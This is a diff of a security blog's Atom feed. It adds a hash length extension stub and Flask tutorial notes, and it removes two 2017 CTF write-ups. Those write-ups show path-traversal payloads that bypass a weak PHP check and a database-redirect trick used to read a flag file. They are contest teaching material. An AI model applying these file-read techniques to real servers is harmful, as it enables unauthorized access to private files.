@@ -194,6 +194,168 @@
   </entry>
   
   <entry>
+    <title>浅尝哈希长度扩展攻击</title>
+    <link href="http://chybeta.github.io/2017/09/26/%E6%B5%85%E5%B0%9D%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
+    <id>http://chybeta.github.io/2017/09/26/浅尝哈希长度扩展攻击/</id>
+    <published>2017-09-26T08:43:11.000Z</published>
+    <updated>2017-09-26T15:20:10.984Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h1><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">hash哈希长度扩展攻击解析</a></li>
+<li><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">深入理解hash长度扩展攻击（sha1为例）</a></li>
+<li><a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="external">科普哈希长度扩展攻击(Hash Length Extension Attacks) </a></li>
+<li><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="external">哈希长度扩展攻击的简介以及HashPump安装使用方法</a></li>
+<li><a href="http://blog.nsfocus.net/hash-length-extension-attack/" target="_blank" rel="external">哈希长度扩展攻击</a></li>
+<li><a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="external">Hash Length Extension Attack </a></li>
+<li><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="external"> Understanding MD5 Length Extension Attack </a></li>
+<li><a href="https://zh.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB" target="_blank" rel="external">维基百科：长度扩展攻击</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;哈希长度扩展攻击&quot;&gt;&lt;a href=&quot;#哈希长度扩展攻击&quot; class=&quot;headerlink&quot; title=&quot;哈希长度扩展攻击&quot;&gt;&lt;/a&gt;哈希长度扩展攻击&lt;/h1&gt;&lt;h1 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; titl
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="哈希长度扩展攻击" scheme="http://chybeta.github.io/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHPSHEv1.5 moneylog.php SQL注入 分析</title>
+    <link href="http://chybeta.github.io/2017/09/21/PHPSHEv1-5-moneylog-php-SQL%E6%B3%A8%E5%85%A5-%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2017/09/21/PHPSHEv1-5-moneylog-php-SQL注入-分析/</id>
+    <published>2017-09-21T12:24:56.000Z</published>
+    <updated>2017-09-21T12:49:10.716Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Flask Web开发笔记(1):程序的基本结构</title>
+    <link href="http://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/"/>
+    <id>http://chybeta.github.io/2017/09/20/Flask-Web开发笔记-1-程序的基本结构/</id>
+    <published>2017-09-20T11:04:49.000Z</published>
+    <updated>2017-09-23T06:00:49.900Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近跟着<a href="https://book.douban.com/subject/26274202/" target="_blank" rel="external">狗书</a>和<a href="http://flask.pocoo.org/" target="_blank" rel="external">flask文档</a>学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。<br><a id="more"></a></p>
+<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>Flask程序必须要创建一个程序实例，程序实例是Flask类的对象。如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div></pre></td></tr></table></figure></p>
+<p>对于该<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask" target="_blank" rel="external">Flask类</a>，其定义如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flask</span>.<span class="title">Flask</span><span class="params">(import_name, static_path=None, static_url_path=None, static_folder=’static’, template_folder=’templates’, instance_path=None, instance_relative_config=False, root_path=None)</span></span></div></pre></td></tr></table></figure></p>
+<p>第一个参数是必须要指定的。Flask用这个参数来找到相对于程序根目录的资源文件位置。如果是使用单一的模块(module)，使用<code>__name__</code>就行了。如果是使用一个包(package)的话，推荐硬编码进去。</p>
+<h1 id="路由和视图函数"><a href="#路由和视图函数" class="headerlink" title="路由和视图函数"></a>路由和视图函数</h1><p>flask程序实例保存了一个URL到python函数的映射关系。当客户端发送请求，服务器将请求转发给flask程序实例，flask程序实例依照映射关系利用函数进行处理。处理URL和函数之间的关系称之为<a href="http://docs.jinkan.org/docs/flask/quickstart.html#routing" target="_blank" rel="external">路由</a>。而像下文的<code>index()</code>和<code>hello()</code>的处理函数，称之为视图函数。</p>
+<p>可以使用<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.route" target="_blank" rel="external">app.route修饰器</a>来定义路由。(注：这里的app是前面已经创建好了的Flask类的对象)。</p>
+<p>基本示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello world!"</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/hello')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello hello world!"</span></div></pre></td></tr></table></figure></p>
+<p>在默认情况下，访问<code>http://localhost:5000/</code>时页面会打印出hello,world!，当访问<code>http://localhost:5000/hello</code>时，页面则会打印出hello hello world!。</p>
+<p>也可以构造动态的URL。通过给URL加上变量，利用装饰器，可以对URL的变量来做出对应的变化。这些动态的部分/变量，需要被标记为<code>&lt;variable_name&gt;</code>或者<code>&lt;converter:variable_name&gt;</code>，这个部分将可以被作为命名参数传递到函数中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"I'm %s"</span> % name</div><div class="line"></div><div class="line"><span class="meta">@app.route('/&lt;int:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">userid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The isinstance(id,int): %s"</span> % isinstance(id,int)</div></pre></td></tr></table></figure></p>
+<p>访问：<code>http://localhost:5000/chybeta</code>，会将字符串<code>chybeta</code>传递到user函数中，并返回给客户都：I’m chybeta。</p>
+<p>若是访问：<a href="http://localhost:5000/1" target="_blank" rel="external">http://localhost:5000/1</a> 则：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/1.png?raw=true" alt=""></p>
+<p>在第二个例子中：<code>@app.route(&#39;/&lt;int:id&gt;&#39;)</code>，指定了一个转换器，将id转换为整型int。目前有以下几种转换器：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类型</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">string</td>
+<td style="text-align:left">默认。接受除了斜杠以外的文本</td>
+</tr>
+<tr>
+<td style="text-align:left">int</td>
+<td style="text-align:left">接受整数</td>
+</tr>
+<tr>
+<td style="text-align:left">float</td>
+<td style="text-align:left">同 int ，但是接受浮点数</td>
+</tr>
+<tr>
+<td style="text-align:left">path</td>
+<td style="text-align:left">和默认的相似，但也接受斜线</td>
+</tr>
+<tr>
+<td style="text-align:left">any</td>
+<td style="text-align:left">matches one of the items provided</td>
+</tr>
+<tr>
+<td style="text-align:left">uuid</td>
+<td style="text-align:left">接受uuid字符串</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>path选择器的作用如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;path:paths&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">path</span><span class="params">(paths)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The path: %s"</span> % paths</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/2.png?raw=true" alt=""></p>
+<p>也就是说，path选择器不会把斜线作为分隔符，而是作为匹配的一整个部分。</p>
+<p>any选择器，未知，哪位解释下？</p>
+<p>uuid，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;uuid:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The uuid: %s"</span> % id</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/3.png?raw=true" alt=""></p>
+<h1 id="flask的Web服务器"><a href="#flask的Web服务器" class="headerlink" title="flask的Web服务器"></a>flask的Web服务器</h1><p>在前面定义好程序实例app后，可以用<code>run()</code>方法来启动flask自带的Web服务器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	app.run(debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
+<p><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.run" target="_blank" rel="external">run()</a>方法的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run(host=None, port=None, debug=None, **options)</div></pre></td></tr></table></figure></p>
+<p>在 debug 模式启用的情况下(debug=True)，服务器会对修改的代码自动重新加载。</p>
+<p>另外，这个本身的服务器并不适用于生产环境。详情可见：<a href="http://flask.pocoo.org/docs/0.12/deploying/#deployment-options" target="_blank" rel="external">Deployment Options</a></p>
+<h1 id="请求与响应循环"><a href="#请求与响应循环" class="headerlink" title="请求与响应循环"></a>请求与响应循环</h1><h2 id="程序与请求上下文"><a href="#程序与请求上下文" class="headerlink" title="程序与请求上下文"></a>程序与请求上下文</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	user_agent = request.headers.get(<span class="string">'User-Agent'</span>)</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;p&gt;Your brower is %s&lt;/p&gt;'</span> % user_agent</div></pre></td></tr></table></figure>
+<p>这里出现了一个<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Request" target="_blank" rel="external">request类</a>。关于其介绍可以见<a href="http://flask.pocoo.org/docs/0.12/api/#flask.request" target="_blank" rel="external">这里</a>。对于传入的request数据，flask保存了一个全局变量<code>request</code>对象。在一个多线程的环境中，flask能确保特定的request对象在特定的线程中全局可访问。</p>
+<p>有一些较为常用的attributes：</p>
+<ol>
+<li><p>request.headers: 以字典形式保存保存了request的头部。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170921/3.png?raw=true" alt=""></p>
+</li>
+<li><p>request.method：指明了是GET还是POST方法等。</p>
+</li>
+<li>request.cookies： 以字典形式保存了cookie</li>
+<li>…. 还有好多 遇到再补充。</li>
+</ol>
+<!-- 接下来介绍一下[flask的上下文](http://flask.pocoo.org/docs/0.12/templating/#standard-context)。 -->
+<h2 id="请求调度"><a href="#请求调度" class="headerlink" title="请求调度"></a>请求调度</h2><p>接前面的URL映射关系与路由。除了使用<code>app.route()</code>修饰器来注册为事件的处理程序外，还有另外两种:</p>
+<ol>
+<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.add_url_rule" target="_blank" rel="external">flask.Flask.add_url_rule()</a></li>
+</ol>
+<ol>
+<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.url_map" target="_blank" rel="external">flask.Flask.url_map</a></li>
+</ol>
+<p>这里不展开，详细可见<a href="http://flask.pocoo.org/docs/0.12/api/#url-route-registrations" target="_blank" rel="external">URL Route Registrations</a></p>
+<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h1 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h1>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近跟着&lt;a href=&quot;https://book.douban.com/subject/26274202/&quot;&gt;狗书&lt;/a&gt;和&lt;a href=&quot;http://flask.pocoo.org/&quot;&gt;flask文档&lt;/a&gt;学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
+    
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
+    
+      <category term="flask" scheme="http://chybeta.github.io/tags/flask/"/>
+    
+      <category term="开发" scheme="http://chybeta.github.io/tags/%E5%BC%80%E5%8F%91/"/>
+    
+  </entry>
+  
+  <entry>
     <title>CSAW CTF 2017-LittleQuery-writeup</title>
     <link href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/"/>
     <id>http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/</id>
@@ -958,140 +1120,6 @@
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="re" scheme="http://chybeta.github.io/tags/re/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TWCTF 2017-Freshen Uploader-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/</id>
-    <published>2017-09-02T02:33:13.000Z</published>
-    <updated>2017-09-03T14:03:40.866Z</updated>
-    
-    <content type="html"><![CDATA[<p>TWCTF 2017-Freshen Uploader-writeup<br>任意文件读取漏洞。php弱类型比较。<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In this year, we stopped using Windows so you can&apos;t use DOS tricks!</div><div class="line">http://fup.chal.ctf.westerns.tokyo/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>该题有两个flag。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/1.png?raw=true" alt=""></p>
-<p>有下载功能，比如点击第一个download后，链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a</div></pre></td></tr></table></figure></p>
-<p>这里存在任意文件读取漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/2.png?raw=true" alt=""></p>
-<p>得到download.php的源代码和第一个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;then_can_y0u_read_file_list?&#125;</div></pre></td></tr></table></figure></p>
-<p>file_list是什么东西？我们读取一下index.php看看：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/3.png?raw=true" alt=""></p>
-<p>根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TWCTF&#123;then_can_y0u_read_file_list?&#125;</span></div><div class="line">$filename = $_GET[<span class="string">'f'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>();</div><div class="line">header(<span class="string">"Content-Type: application/octet-stream"</span>);</div><div class="line">header(<span class="string">"Content-Disposition: attachment; filename='$filename'"</span>);</div><div class="line">readfile(<span class="string">"uploads/$filename"</span>);</div></pre></td></tr></table></figure>
-<p>仔细看一下判断语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(stripos($filename, &apos;file_list&apos;) != false) die();</div></pre></td></tr></table></figure></p>
-<p>strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果<code>$filename</code>以<code>file_list</code>开头，则<code>stripos($filename, &#39;file_list&#39;)</code>会返回0，而采用的是<code>!=</code>，也就是说可能存在弱类型比较问题:<code>0 == false</code>。</p>
-<p>绕过了stripos，怎么读取file_list文件？构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php</div></pre></td></tr></table></figure></p>
-<p>这样它会把第一个file_list当成文件夹，之后用两个<code>../</code>返回上一层文件夹，并最终读取到file_list.php。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/4.png?raw=true" alt=""></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/5.png?raw=true" alt=""></p>
-<p>第二个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;php_is_very_secure&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;TWCTF 2017-Freshen Uploader-writeup&lt;br&gt;任意文件读取漏洞。php弱类型比较。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ISG2017-wmwcms-writeup</title>
-    <link href="http://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/"/>
-    <id>http://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/</id>
-    <published>2017-08-31T08:29:51.000Z</published>
-    <updated>2017-08-31T10:06:49.113Z</updated>
-    
-    <content type="html"><![CDATA[<p>ISG2017-wmwcms-writeup<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can u conquer this crude cms and get flag?</div><div class="line">link: http://202.120.7.204:7242</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看robots.txt，可以发现有压缩包，下载下来后得到源码。</p>
-<p>文件目录如下；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/3.png?raw=true" alt=""></p>
-<p>public/app.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    session_start();</div><div class="line">    define(<span class="string">'APP_PATH'</span>, dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/server/'</span>);</div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'sql.php'</span>;</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'func.php'</span>;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</div><div class="line">        errormsg(<span class="string">"action is required."</span>);</div><div class="line">    &#125;</div><div class="line">    $actions = [<span class="string">"login"</span>, <span class="string">"logout"</span>, <span class="string">"img"</span>];</div><div class="line">    <span class="keyword">if</span> (!in_array($_GET[<span class="string">"action"</span>], $actions)) &#123;</div><div class="line">        errormsg(<span class="string">'Hacking attempt'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span> APP_PATH . $_GET[<span class="string">"action"</span>] . <span class="string">".php"</span>;</div><div class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>server/img.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'sql.php'</span>;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'uid'</span>])) &#123;</div><div class="line">    $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $uid = intval($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $sql = <span class="string">"select portrait from user where id = ?"</span>;</div><div class="line">    $sth = $dbh-&gt;prepare($sql);</div><div class="line">    $sth-&gt;execute([$uid]);</div><div class="line">    $user = $sth-&gt;fetchAll();</div><div class="line">    <span class="keyword">if</span>(count($user) &gt; <span class="number">0</span>)&#123;</div><div class="line">        $user = $user[<span class="number">0</span>];</div><div class="line">        $portrait = $user[<span class="string">"portrait"</span>];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">header(<span class="string">"Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate"</span>);</div><div class="line">header(<span class="string">"Content-type: image/png;charset=gb2312"</span>);</div><div class="line"><span class="keyword">echo</span> file_get_contents($portrait);</div></pre></td></tr></table></figure></p>
-<p>server/sql.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
-<p>先配置远程数据库可以访问。修改/etc/mysql/mysql.conf.d/mysqld.cnf。将里面的bind-address = 127.0.0.1注释掉。</p>
-<p>接下来配置mysql。这里我用root身份登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">mysql&gt; USE wmwcms;</div><div class="line">Database changed</div><div class="line">mysql&gt; CREATE TABLE `user` (</div><div class="line">    -&gt;   `id` INT AUTO_INCREMENT,</div><div class="line">    -&gt;   `name` VARCHAR(100) NULL,</div><div class="line">    -&gt;   `pwd` VARCHAR(64) NOT NULL,</div><div class="line">    -&gt;   `portrait` VARCHAR(64) DEFAULT &quot;../server/flag&quot;,</div><div class="line">    -&gt;   PRIMARY KEY (`id`),</div><div class="line">    -&gt;   UNIQUE KEY `Duplicate_name` (`name`)</div><div class="line">    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;</div><div class="line">Query OK, 0 rows affected (0.19 sec)</div><div class="line"></div><div class="line">mysql&gt; INSERT INTO `user` (`name`, `pwd`) values (&quot;test&quot;, &quot;a94a8fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);</div><div class="line">Query OK, 1 row affected (1.06 sec)</div><div class="line"></div><div class="line">mysql&gt; select id,name,pwd,portrait from user;</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">| id | name | pwd                                      | portrait       |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">|  1 | test | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | ../server/flag |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
